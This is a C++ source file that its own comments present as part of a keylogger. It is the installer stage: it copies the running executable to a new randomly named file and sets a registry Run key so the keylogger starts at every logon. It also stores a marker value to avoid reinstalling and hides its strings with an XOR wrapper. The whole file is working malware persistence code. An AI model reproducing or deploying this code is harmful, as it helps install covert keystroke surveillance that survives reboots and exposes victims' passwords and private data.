#include "c_includes.hpp"
#include "c_xor.hpp"

namespace c_installer {

	inline void reg_edit(std::string dest_path) {
		HKEY__* rgkey, * rgkey2;

		RegCreateKeyA(HKEY_CURRENT_USER, c_xor("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &rgkey);
		RegSetValueExA(rgkey, c_utils::random_string(7).c_str(), 0, REG_SZ, (unsigned char*)dest_path.c_str(), dest_path.size());
		RegCloseKey(rgkey); //here i create a key to auto run the keylogger

		RegCreateKeyA(HKEY_CURRENT_USER, c_xor("SOFTWARE\\Microsoft\\Windows"), &rgkey2);
		RegSetValueExA(rgkey2, c_config::init::reg_name.c_str(), 0, 0, 0, 0);
		RegCloseKey(rgkey2); //identifier so we dont save the keylogger two times in the auto startup thing
	}

	inline void install() {
		HKEY__* klg;
		RegOpenKeyExA(HKEY_CURRENT_USER, c_xor("SOFTWARE\\Microsoft\\Windows"), 0, KEY_READ, &klg);

		if (RegQueryValueExA(klg, c_config::init::reg_name.c_str(), 0, 0, 0, 0) != ERROR_FILE_NOT_FOUND) //check if the identifier already exists
			return;

		char exe_full_path[MAX_PATH];
		GetModuleFileNameA(0, exe_full_path, MAX_PATH); //get full path of exe

		FILE* archive;
		fopen_s(&archive, exe_full_path, c_xor("rb"));

		std::string dest_path = c_config::init::destination_path + c_utils::random_string(7) + c_xor(".exe");

		FILE* destination;
		fopen_s(&destination, dest_path.c_str(), c_xor("wb"));

		size_t size;
		char buffer[BUFSIZ];

		while (size = fread(buffer, 1, BUFSIZ, archive)) {
			fwrite(buffer, 1, size, destination); //copy the file to it's new location
		}

		reg_edit(dest_path);

		fclose(archive);
		fclose(destination);
	}

}